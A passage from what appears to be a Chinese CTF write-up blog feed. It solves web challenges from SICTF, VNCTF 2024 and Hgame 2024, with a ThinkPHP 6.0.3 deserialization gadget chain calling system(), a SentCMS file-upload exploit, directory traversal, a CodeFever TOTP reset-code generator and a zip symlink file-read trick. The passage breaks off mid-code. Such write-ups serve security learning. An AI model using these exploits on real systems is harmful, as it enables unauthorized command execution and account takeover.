eat！！！&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>一般只有一个preg_match的判断，里面是一个die函数，用回溯次数绕过可以解，下面stripos函数需要我们的参数里有603THINKPHP，所以传一百万个a+603THINKPHP即可。</p><p>第三步就是反序列化了，这是thinkphp6.0.3有现成的poc，在网上一搜第一个就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">concern</span>;<br> <span class="hljs-class"><span class="hljs-keyword">trait</span> <span class="hljs-title">Attribute</span></span><br><span class="hljs-class"> </span>&#123;<br>     <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [<span class="hljs-string">&quot;key&quot;</span>=&gt;<span class="hljs-string">&quot;cat /Oyst3333333r.php&quot;</span>];<br>     <span class="hljs-keyword">private</span> <span class="hljs-variable">$withAttr</span> = [<span class="hljs-string">&quot;key&quot;</span>=&gt;<span class="hljs-string">&quot;system&quot;</span>];<br> &#125;<br> <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>;<br> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class"> </span>&#123;<br>     <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;<br>     <span class="hljs-keyword">private</span> <span class="hljs-variable">$lazySave</span> = <span class="hljs-literal">true</span>;<br>     <span class="hljs-keyword">protected</span> <span class="hljs-variable">$withEvent</span> = <span class="hljs-literal">false</span>;<br>     <span class="hljs-keyword">private</span> <span class="hljs-variable">$exists</span> = <span class="hljs-literal">true</span>;<br>     <span class="hljs-keyword">private</span> <span class="hljs-variable">$force</span> = <span class="hljs-literal">true</span>;<br>     <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;<br>     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span>=<span class="hljs-string">&quot;&quot;</span></span>)</span>&#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$obj</span>;<br>     &#125;<br> &#125;<br> <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>;<br> <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class"> </span>&#123;&#125;<br> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>();<br> <span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>(<span class="hljs-variable">$a</span>);<br> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br></code></pre></td></tr></table></figure><p>post传参拿到flag</p><p><strong>SICTF{c35c6cef-3fbb-41d3-9a53-1191b957a9f1}</strong></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF 2024</title>
    <link href="/2024/02/17/VNCTF%202024/"/>
    <url>/2024/02/17/VNCTF%202024/</url>
    
    <content type="html"><![CDATA[<h1 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h1><p>打转块小游戏奥，直接F12找game.js，里面有这么几行<br><img src="/img/VNCTF_2024/1.png" alt="图片.png"><br>很明显把中间两行放在控制台打出来就好了，<br><img src="/img/VNCTF_2024/2.png" alt="图片.png"></p><p><strong>VNCTF{W31c0m3_t0_VNCTF_2024_g@od_J0B!!!!}</strong></p><h1 id="TrySent"><a href="#TrySent" class="headerlink" title="TrySent"></a>TrySent</h1><p>thinkphp Sentcms去网上找相关漏洞，找到这么一篇文章：<br><a href="https://blog.hanayuzu.top/articles/37dacab4">https://blog.hanayuzu.top/articles/37dacab4</a><br>是无需登录的任意文件上传漏洞，在&#x2F;admin&#x2F;upload&#x2F;upload页面抓包后，修改包为文章的内容，然后上传，进入<br><img src="/img/VNCTF_2024/3.png" alt="图片.png"></p><p>这里面，就发现该页面变成phpinfo了，<br><img src="/img/VNCTF_2024/4.png" alt="图片.png"></p><p><strong>vnctf{6f2f29dd-934f-4490-9054-6a6f11892a86}</strong></p><h1 id="CutePath"><a href="#CutePath" class="headerlink" title="CutePath"></a>CutePath</h1><p>这道题是目录穿越，在url里加上&#x2F;#&#x2F;..&#x2F;即可到上一目录，<br><img src="/img/VNCTF_2024/5.png" alt="图片.png"><br>第二个文件明显是base64加密，拿去解密后，得到管理员密码，admin:gdgm.edu.cn@M1n9K1n9P@as<br>登录后继续穿越，&#x2F;#&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;flag&#x2F;flag在这个文件夹下找到flag.txt，但是我们没法下载，也打不开他，我们需要把他移动到网站根目录才能看见，<br>这里修改flag.txt名字为<br>..&#x2F;..&#x2F;..&#x2F;home&#x2F;ming&#x2F;share_main&#x2F;flag.txt<br>这样就可以在网站根目录下找到flag.txt，然后下载下来拿到flag。<br><strong>VNCTF{564e406840636b3156315f6764676d}</strong></p><h1 id="codefever-again"><a href="#codefever-again" class="headerlink" title="codefever_again"></a>codefever_again</h1><p>这道题是需要在网上找源码的，我是运气好做出来的。<br><a href="https://or4ngesec.github.io/post/xhlj-writeup-by-or4nge/#real-world-git">https://or4ngesec.github.io/post/xhlj-writeup-by-or4nge/#real-world-git</a><br>忘记密码的逻辑中，生成的验证码只跟邮箱和时间戳有关系，没有引入随机数，本地跑一下就能跑出来，然后利用这个验证码重置<a href="mailto:&#114;&#111;&#111;&#116;&#x40;&#x63;&#x6f;&#100;&#x65;&#102;&#x65;&#x76;&#101;&#x72;&#46;&#99;&#110;">&#114;&#111;&#111;&#116;&#x40;&#x63;&#x6f;&#100;&#x65;&#102;&#x65;&#x76;&#101;&#x72;&#46;&#99;&#110;</a>的密码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// this function use to generated uuid</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">service</span>\<span class="hljs-title class_">Utility</span>;<br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;TOTP_SALT&#x27;</span>, <span class="hljs-string">&#x27;codefever-salt&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TOTP</span> </span>&#123;<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SALT</span> = <span class="hljs-string">&#x27;codefever_salt&#x27;</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TOTP_REFRESH_INTERVAL</span> = <span class="hljs-number">30</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TOTP_CHECK_WINDOW_MIN</span> = -<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TOTP_CHECK_WINDOW_MAX</span> = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PASSWORD_LENGTH</span> = <span class="hljs-number">6</span>;<br><br>    <span class="hljs-built_in">static</span> <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hashInput</span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$input</span></span>) </span>&#123;<br>        <span class="hljs-variable">$salt</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">SALT</span>;<br>        <span class="hljs-keyword">if</span> (TOTP_SALT) &#123;<br>            <span class="hljs-variable">$salt</span> = TOTP_SALT;<br>        &#125;<br><br>        <span class="hljs-variable">$input</span> = <span class="hljs-variable">$input</span> ? <span class="hljs-variable">$input</span> : <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">SALT</span>;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$input</span>) . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>), <span class="hljs-literal">FALSE</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">static</span> <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">genTotp</span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$hashedInput</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$timestamp</span></span>) </span>&#123;<br>        <span class="hljs-variable">$sequence</span> = <span class="hljs-title function_ invoke__">floor</span>(<span class="hljs-variable">$timestamp</span> / <span class="hljs-number">30</span>);<br>        <span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$hashedInput</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$sequence</span>), <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$sequence</span>), <span class="hljs-literal">TRUE</span>);<br><br>        <span class="hljs-variable">$finalValue</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$finalValue</span> += <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$code</span>[<span class="hljs-variable">$index</span>]);<br>            <span class="hljs-variable">$finalValue</span> = <span class="hljs-variable">$finalValue</span> &lt;&lt; <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$index</span>++;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$code</span>[<span class="hljs-variable">$index</span>]));<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$finalValue</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">static</span> <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trimTotp</span> (<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$sourceTotp</span></span>) </span>&#123;<br>        <span class="hljs-variable">$trimedTotp</span> = <span class="hljs-variable">$sourceTotp</span> % <span class="hljs-title function_ invoke__">pow</span>(<span class="hljs-number">10</span>, <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">PASSWORD_LENGTH</span>);<br>        <span class="hljs-variable">$format</span> = <span class="hljs-string">&quot;%&#x27;.0&quot;</span>. <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">PASSWORD_LENGTH</span> .<span class="hljs-string">&quot;u&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-variable">$format</span>, <span class="hljs-title function_ invoke__">abs</span>(<span class="hljs-variable">$trimedTotp</span>));<br>    &#125;<br><br><br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$input</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">trimTotp</span>(<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">genTotp</span>(<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">hashInput</span>(<span class="hljs-variable">$input</span>), <span class="hljs-title function_ invoke__">time</span>()));<br>    &#125;<br><br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$input</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span></span>) </span>&#123;<br>        <span class="hljs-variable">$hashedInput</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">hashInput</span>(<span class="hljs-variable">$input</span>);<br>        <span class="hljs-variable">$currentTime</span> = <span class="hljs-title function_ invoke__">time</span>();<br>        <span class="hljs-keyword">for</span> (<br>            <span class="hljs-variable">$windowIndex</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">TOTP_CHECK_WINDOW_MIN</span>;<br>            <span class="hljs-variable">$windowIndex</span> &lt;= <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">TOTP_CHECK_WINDOW_MAX</span>;<br>            <span class="hljs-variable">$windowIndex</span>++<br>        ) &#123;<br>            <span class="hljs-keyword">if</span> (<br>                <span class="hljs-variable">$code</span> === <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">trimTotp</span>(<br>                    <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">genTotp</span>(<br>                        <span class="hljs-variable">$hashedInput</span>, <br>                        <span class="hljs-variable">$currentTime</span> + (<span class="hljs-variable">$windowIndex</span> * <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">TOTP_REFRESH_INTERVAL</span>)<br>                    )<br>                )<br>            ) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;root@codefever.cn&#x27;</span>;<br><span class="hljs-keyword">echo</span> TOTP::<span class="hljs-title function_ invoke__">generate</span>(<span class="hljs-variable">$email</span>);<br><br></code></pre></td></tr></table></figure><p>重置密码后，就可以以管理员的身份登录进去，<br><a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#99;&#x6f;&#100;&#101;&#102;&#101;&#118;&#101;&#x72;&#x2e;&#x63;&#110;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#99;&#x6f;&#100;&#101;&#102;&#101;&#118;&#101;&#x72;&#x2e;&#x63;&#110;</a>这是管理员账户。登录进去后<br><img src="/img/VNCTF_2024/6.png" alt="图片.png"></p><p><img src="/img/VNCTF_2024/7.png" alt="图片.png"><br><img src="/img/VNCTF_2024/8.png" alt="图片.png"><br>把生成的密码记下来。然后登录<br><img src="/img/VNCTF_2024/9.png" alt="图片.png"><br><img src="/img/VNCTF_2024/10.png" alt="图片.png"><br>修改邮箱来反弹shell，保存后服务器开启监听，然后进入主界面，拿到flag<br><strong>VNCTF{C0de_F3eve!_i3nt_so_H4rd!ri9ht?}</strong></p><p>剩下的题做不来了，还是挺难的QWQ<br><img src="/img/VNCTF_2024/11.png" alt="图片.png"></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame 2024 week 3</title>
    <link href="/2024/02/13/Hgame-2024-week-3/"/>
    <url>/2024/02/13/Hgame-2024-week-3/</url>
    
    <content type="html"><![CDATA[<p>by:Infernity</p><h1 id="Zero-Link"><a href="#Zero-Link" class="headerlink" title="Zero Link"></a>Zero Link</h1><p>这道题我做了好久，源码一大堆，撇去其他的，主要是file.go和routes.go这两个文件。</p><p>首先进入manager页面，需要登录，只有Admin才允许登录，我们需要拿到admin的密码，源码里给隐藏起来了，</p><p>Zero Link&#x2F;internal&#x2F;database&#x2F;sqlite.go</p><p>这个文件里有所有人的密码，但是没有admin的，我们需要去找找。</p><p>我们抓这个包</p><p><img src="/img/Hgame_2024/19.png" alt="图片.png"></p><p>然后把Username和Token都留空，就会得到admin的密码了。</p><p><img src="/img/Hgame_2024/20.png" alt="图片.png"></p><p>拿到密码后可以登录，登录进去之后可以传zip文件，</p><p>在routes.go文件中，我们可以看到这些路由</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go">api := r.Group(<span class="hljs-string">&quot;/api&quot;</span>)<br>&#123;<br>    api.GET(<span class="hljs-string">&quot;/ping&quot;</span>, ping.Ping)<br>    api.POST(<span class="hljs-string">&quot;/user&quot;</span>, user.GetUserInfo)<br>    api.POST(<span class="hljs-string">&quot;/login&quot;</span>, auth.AdminLogin)<br><br>    apiAuth := api.Group(<span class="hljs-string">&quot;&quot;</span>)<br>    apiAuth.Use(middleware.Auth())<br>    &#123;<br>        apiAuth.POST(<span class="hljs-string">&quot;/upload&quot;</span>, file.UploadFile)<br>        apiAuth.GET(<span class="hljs-string">&quot;/unzip&quot;</span>, file.UnzipPackage)<br>        apiAuth.GET(<span class="hljs-string">&quot;/secret&quot;</span>, file.ReadSecretFile)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有个&#x2F;api&#x2F;unzip的路由，一般unzip就是要打软链接了。</p><p>在flie.go文件中找到跟unzip有关的方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">UnzipPackage</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>files, err := filepath.Glob(<span class="hljs-string">&quot;/app/uploads/*.zip&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to get list of .zip files&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> files &#123;<br>cmd := exec.Command(<span class="hljs-string">&quot;unzip&quot;</span>, <span class="hljs-string">&quot;-o&quot;</span>, file, <span class="hljs-string">&quot;-d&quot;</span>, <span class="hljs-string">&quot;/tmp/&quot;</span>)<span class="hljs-comment">//主要就是这一句</span><br><span class="hljs-keyword">if</span> err := cmd.Run(); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to unzip file: &quot;</span> + file,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><br>c.JSON(http.StatusOK, FileResponse&#123;<br>Code:    http.StatusOK,<br>Message: <span class="hljs-string">&quot;Unzip completed&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>但是这是给我们把东西解压到了&#x2F;tmp目录的，我们还是看不到，这里就需要找中间件了。</p><p>在routes.go中有这么一条语句apiAuth.GET(“&#x2F;secret”, file.ReadSecretFile)</p><p>就是&#x2F;api&#x2F;secret路由，我们找到file.go中相关代码块：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadSecretFile</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>secretFilepath := <span class="hljs-string">&quot;/app/secret&quot;</span><br>content, err := util.ReadFileToString(secretFilepath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to read secret file&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>secretContent, err := util.ReadFileToString(content)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to read secret file content&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.JSON(http.StatusOK, FileResponse&#123;<br>Code:    http.StatusOK,<br>Message: <span class="hljs-string">&quot;Secret content read successfully&quot;</span>,<br>Data:    secretContent,<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到secret文件的位置是&#x2F;app&#x2F;secret，而&#x2F;api&#x2F;secret可以链接这个&#x2F;app&#x2F;secret，而这个secret是起到一个读取文件的作用。当前&#x2F;app&#x2F;secret的内容是&#x2F;fake_flag，所以我们打开&#x2F;api&#x2F;secret就是读取到了&#x2F;fake_flag</p><p>那么我们就需要打两个软链接，第一个软链接是把&#x2F;tmp链接到&#x2F;app，第二个是打入一个我们自己写的secret。</p><p>先新建一个文件夹，输入以下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /app <span class="hljs-built_in">link</span><br>zip --symlinks 1.zip <span class="hljs-built_in">link</span><br></code></pre></td></tr></table></figure><p>这第一个链接到&#x2F;app的软链接就写好了。把他上传上去，然后进入&#x2F;api&#x2F;unzip里解压。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> <span class="hljs-built_in">link</span><br><span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">link</span><br><span class="hljs-built_in">cd</span> <span class="hljs-built_in">link</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;../flag&#x27;</span> &gt;secret<br><span class="hljs-built_in">cd</span> ../<br>zip -r 2.zip <span class="hljs-built_in">link</span><br></code></pre></td></tr></table></figure><p>接着在同一个文件夹下输入以上命令。</p><p>同样的，把2.zip上传并解压，最后打开&#x2F;api&#x2F;secret，拿到flag。</p><p><img src="/img/Hgame_2024/21.png" alt="图片.png"></p><p><strong>hgame{w0W_u_Re4l1y_Kn0W_Golang_4ND_uNz1P!}</strong></p><h1 id="WebVPN"><a href="#WebVPN" class="headerlink" title="WebVPN"></a>WebVPN</h1><p>这道题给了源码，在flag路由可以获取flag，前提是要满足如下条件，总的来说就是需要走他设置的代理，然后令url&#x3D;<a href="http://127.0.0.1:3000/flag">http://127.0.0.1:3000/flag</a> 这就是走本地的url。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (<br>    req.<span class="hljs-property">headers</span>.<span class="hljs-property">host</span> != <span class="hljs-string">&quot;127.0.0.1:3000&quot;</span> ||<br>    req.<span class="hljs-property">hostname</span> != <span class="hljs-string">&quot;127.0.0.1&quot;</span> ||<br>    req.<span class="hljs-property">ip</span> != <span class="hljs-string">&quot;127.0.0.1&quot;</span> <br>  ) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">const</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>  res.<span class="hljs-title function_">send</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure><p>但是在源码里给了限制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> userStorage = &#123;<br>  <span class="hljs-attr">username</span>: &#123;<br>    <span class="hljs-attr">password</span>: <span class="hljs-string">&quot;password&quot;</span>,<br>    <span class="hljs-attr">info</span>: &#123;<br>      <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,<br>    &#125;,<br>    <span class="hljs-attr">strategy</span>: &#123;<br>      <span class="hljs-string">&quot;baidu.com&quot;</span>: <span class="hljs-literal">true</span>,<br>      <span class="hljs-string">&quot;google.com&quot;</span>: <span class="hljs-literal">false</span>,<br>    &#125;,<br>  &#125;,<br>&#125;;<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/proxy&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; username &#125; = req.<span class="hljs-property">session</span>;<br>  <span 